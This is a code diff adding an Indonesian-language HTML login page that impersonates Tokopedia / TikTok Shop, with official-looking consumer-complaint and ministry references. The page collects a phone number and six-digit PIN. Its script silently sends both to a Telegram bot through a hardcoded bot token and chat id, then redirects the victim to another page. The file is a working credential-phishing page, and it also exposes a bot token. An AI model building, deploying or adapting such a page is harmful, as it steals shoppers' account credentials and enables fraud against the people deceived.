@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Nomor HP</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    body {
+      background: #fff;
+      color: #000;
+    }
+    .header {
+      background-color: #03AC0E;
+      color: white;
+      padding: 14px;
+      text-align: center;
+      font-weight: bold;
+      font-size: 16px;
+    }
+    .container {
+      padding: 20px;
+    }
+    .form-group {
+      margin-bottom: 18px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      width: 100%;
+      background-color: #03AC0E;
+      color: white;
+      border: none;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .loading {
+      display: none;
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+      color: #03AC0E;
+    }
+    .footer-icons {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 40px;
+      padding: 20px 0;
+      border-top: 1px solid #eee;
+    }
+    .footer-icon {
+      text-align: center;
+      font-size: 12px;
+      color: #444;
+    }
+    .footer-icon img {
+      width: 30px;
+      height: 30px;
+      margin-bottom: 6px;
+    }
+    .footer {
+      text-align: center;
+      margin: 20px;
+      font-size: 13px;
+      color: #333;
+    }
+    .footer strong {
+      color: #03AC0E;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">tokopedia | TikTok Shop</div>
+
+  <div class="container">
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="phone">Nomor Handphone *</label>
+        <input type="tel" id="phone" name="phone" placeholder="+62" required maxlength="13" inputmode="numeric" pattern="[0-9]*" />
+      </div>
+      <div class="form-group">
+        <label for="pin">PIN 6 Angka *</label>
+        <input type="password" id="pin" name="pin" placeholder="******" maxlength="6" required inputmode="numeric" pattern="[0-9]*" />
+      </div>
+      <button type="submit" id="submitBtn">Masuk</button>
+      <div class="loading" id="loading"> Sedang diproses...</div>
+    </form>
+  </div>
+
+  <div class="footer-icons">
+    <div class="footer-icon">
+      <img src="https://img.icons8.com/ios/50/security-checked.png" alt="Keamanan">
+      <div>Akun &<br>Keamanan</div>
+    </div>
+    <div class="footer-icon">
+      <img src="https://img.icons8.com/ios/50/complaint.png" alt="Pelaporan">
+      <div>Pelaporan</div>
+    </div>
+    <div class="footer-icon">
+      <img src="https://img.icons8.com/ios/50/shopping-cart--v1.png" alt="Pesanan">
+      <div>Pesanan</div>
+    </div>
+    <div class="footer-icon">
+      <img src="https://img.icons8.com/ios/50/more.png" alt="Lainnya">
+      <div>Lainnya</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>Layanan Pengaduan Konsumen <br><strong>PT.Tokopedia</strong></p>
+    <p>Call Center: 08154037098</p>
+    <p>Direktorat Jenderal Perlindungan Konsumen & Tertib Niaga <br>Kementerian Perdagangan Republik Indonesia</p>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const loading = document.getElementById('loading');
+    const submitBtn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const phone = document.getElementById('phone').value.trim();
+      const pin = document.getElementById('pin').value.trim();
+
+      loading.style.display = 'block';
+      submitBtn.disabled = true;
+
+      const token = '7223686317:AAFJKbUn4qC-s9s6Ii-vQRevQ47bk47TS2I';
+      const chat_id = '7386992179';
+      const message = `Login Baru\nNomor HP: ${phone}\nPIN: ${pin}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      }).finally(() => {
+        // Tampilkan "berhasil" sebentar lalu alihkan ke tp.html
+        setTimeout(() => {
+          window.location.href = "tp.html";
+        }, 1000);
+      });
+    });
+  </script>
+
+</body>
+</html>
